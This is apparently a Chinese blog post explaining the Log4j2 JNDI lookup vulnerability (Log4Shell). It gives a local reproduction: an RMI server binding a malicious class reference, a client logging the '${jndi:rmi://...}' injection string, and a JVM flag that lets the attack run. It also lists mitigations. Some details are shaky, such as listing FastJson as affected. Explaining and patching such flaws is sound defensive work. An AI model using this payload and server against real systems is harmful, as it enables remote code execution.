---
categories: ["safe"] 
tags: ["Log4j2"] 
title: "Log4j2远程执行漏洞"
# linkTitle: ""
weight: 5
description: >
  
---

# 背景

都2021年了，居然还有这种简单粗暴直接替换占位符的安全问题，真的难以想象。比之前fastjson的漏洞还要大、还要容易。


# 问题原因

## 占位符替换机制

log4j提供了占位符的功能，如下：

```java
logger.info("os: ${java:os}");
// 会输出操作系统的信息
```
会把 ${java:os} 替换成了 System.getProperties("os") 
## jndi占位符替换

离谱的是 log4j 还提供了关于 jndi 的占位符。如：

```java
logger.info("${jndi:rmi://127.0.0.1:1099/hello}")
```

# 影响范围

1、log4j 2.x.x版本（包括直接、间接依赖；1.x版本不受影响）

2、FastJson < 1.2.69 版本

# 漏洞复现

更多源码参考：[java-demo logsafe](https://github.com/chnherb/java-demo/tree/master/src/main/java/com/huangbo/log/logsafe)

## jndi服务

```java
package com.huangbo.log.logsafe;
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.NamingException;
import javax.naming.Reference;
import javax.swing.*;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
public class RmiSafeServer {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        LocateRegistry.createRegistry(1099);
        Registry registry = LocateRegistry.getRegistry();
        Reference reference = new Reference("com.huangbo.log.logsafe.Hello", "com.huangbo.log.logsafe.Hello", "http://127.0.0.1:1099/");
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(reference);
        registry.bind("hello", refObjWrapper);
    }
}
class Hello {
    static {
        JOptionPane.showConfirmDialog(null, "嘿嘿嘿！！");
    }
}
```
## 用户程序

```java
package com.huangbo.log.logsafe;
import lombok.extern.slf4j.Slf4j;
@Slf4j
public class LogSafeDemo {
    public static void main(String[] args) {
//        String name = "${java:os}";
        String name = "${jndi:rmi://localhost:1099/hello}";
        login(name);
    }
    public static void login(String name){
        log.info(name);
    }
}
```
## 触发用户程序

注意：务必关闭服务端和客户端的全局代理模式！

启动用户程序发现报错：

```xml
2021-12-18 17:51:05,537 main WARN Error looking up JNDI resource [rmi://localhost:1099/hello]. 
javax.naming.ConfigurationException: The object factory is untrusted. 
Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.
```
因为本机用的是JDK8，添加了一个新的属性默认为false，需要在用户侧手动开启。添加如下参数，IDEA中配置"VM Options"
```shell
-Dcom.sun.jndi.rmi.object.trustURLCodebase=true
```
重新启动，发现成功入侵！
# 解决方法

## 更新log4j版本

将 log4j 到最新版本 2.15 及以上 ，亲测有效

## 添加jvm参数

亲测不行！

添加jvm参数，禁止占位符替换

```json
-Dlog4j2.FORMATMsgNoLookups=true 
```
或创建 "log4j2.component.properties" 文件，文件中加入"log4j2.formatMsgNoLookups=true" 
## 升级到java8

Java 8 中添加了一个新的属性 com.sun.jndi.rmi.object.trustURLCodebase，这是一个 boolean 类型。默认值是 false，在使用 jndi 时会抛出一个报错阻止加载远程服务器提供的代码。

## 删除jar包class文件

删除 log4j-core-*.jar 中 org/apache/logging/log4j/core/lookup/JndiLookup.class 这个文件，彻底进行不了 jndi

>可行性较小


# Reference

[Log4j 爆“核弹级”漏洞](https://mp.weixin.qq.com/s/Yq9k1eBquz3mM1sCinneiA)

[Log4j 惊天远控漏洞: 原理？如何解决？](https://www.bilibili.com/read/cv14380391)
